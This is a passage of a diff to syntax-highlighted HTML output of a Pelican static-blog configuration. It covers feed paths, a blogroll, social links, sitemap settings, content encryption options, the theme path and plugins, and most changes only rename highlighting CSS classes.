+&lt;span class="n"&gt;CATEGORY_FEED_RSS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;feeds/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;.rss.xml&amp;#39;&lt;/span&gt;
 
-&lt;span class="c"&gt;# Blogroll&lt;/span&gt;
-&lt;span class="n"&gt;LINKS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Freebuf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://freebuf.com/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
-    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;ltyleader&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://litengyao.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),)&lt;/span&gt;
+&lt;span class="c1"&gt;# Blogroll&lt;/span&gt;
+&lt;span class="n"&gt;LINKS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Freebuf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://freebuf.com/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ltyleader&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://litengyao.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),)&lt;/span&gt;
 
-&lt;span class="c"&gt;# Social widget&lt;/span&gt;
-&lt;span class="n"&gt;SOCIAL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;shangfute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;mailto://shangfute@163.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),)&lt;/span&gt;
+&lt;span class="c1"&gt;# Social widget&lt;/span&gt;
+&lt;span class="n"&gt;SOCIAL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;shangfute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mailto://shangfute@163.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),)&lt;/span&gt;
 
 &lt;span class="n"&gt;DEFAULT_PAGINATION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;
 
-&lt;span class="c"&gt;# Uncomment following line if you want document-relative URLs when developing&lt;/span&gt;
-&lt;span class="c"&gt;# RELATIVE_URLS = True&lt;/span&gt;
+&lt;span class="c1"&gt;# Uncomment following line if you want document-relative URLs when developing&lt;/span&gt;
+&lt;span class="c1"&gt;# RELATIVE_URLS = True&lt;/span&gt;
 
-&lt;span class="n"&gt;JINJA_EXTENSIONS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;jinja2.ext.ExprStmtExtension&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,]&lt;/span&gt;
-&lt;span class="n"&gt;GITHUB_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;https://github.com/shangfute&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;JINJA_EXTENSIONS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;jinja2.ext.ExprStmtExtension&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,]&lt;/span&gt;
+&lt;span class="n"&gt;GITHUB_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://github.com/shangfute&amp;#39;&lt;/span&gt;
 
 &lt;span class="n"&gt;SITEMAP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;#39;format&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;#39;priorities&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;articles&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;indexes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;format&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;priorities&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;articles&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;indexes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;
     &lt;span class="p"&gt;},&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;#39;changefreqs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;articles&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;monthly&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;indexes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;daily&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-        &lt;span class="s"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;monthly&amp;#39;&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;changefreqs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;articles&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;monthly&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;indexes&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;daily&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;monthly&amp;#39;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 
 &lt;span class="n"&gt;ENCRYPT_CONTENT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;#39;title_prefix&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[Encrypted]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;#39;summary&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;This content is encrypted.&amp;#39;&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;title_prefix&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;[Encrypted]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;summary&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;This content is encrypted.&amp;#39;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 
-&lt;span class="n"&gt;THEME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;E:&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;workspace&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;blog&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;pelican-themes&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;aboutwilson&amp;#39;&lt;/span&gt;
-&lt;span class="c"&gt;# from pelican-plugins&lt;/span&gt;
+&lt;span class="n"&gt;THEME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;E:&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;workspace&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;blog&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;pelican-themes&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;aboutwilson&amp;#39;&lt;/span&gt;
+&lt;span class="c1"&gt;# from pelican-plugins&lt;/span&gt;
 &lt;span class="n"&gt;PLUGINS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;encrypt_content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;render_math&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
